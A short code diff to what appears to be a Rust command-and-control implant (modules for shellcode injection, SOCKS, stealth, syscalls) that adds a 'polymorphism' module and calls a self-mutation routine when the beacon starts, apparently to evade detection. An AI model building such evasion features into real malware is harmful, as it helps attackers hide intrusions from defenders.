@@ -48,6 +48,7 @@ mod shell;
 mod shinject;
 mod sleep;
 mod socks;
+mod polymorphism;
 mod stealth;
 mod syscalls;
 mod ssh;
@@ -90,6 +91,8 @@ pub fn real_main() -> Result<(), Box<dyn Error>> {
 
 /// Main code which runs the agent
 fn run_beacon() -> Result<(), Box<dyn Error>> {
+    polymorphism::mutate_self();
+
     #[cfg(target_os = "windows")]
     {
         let _ = std::panic::catch_unwind(|| {
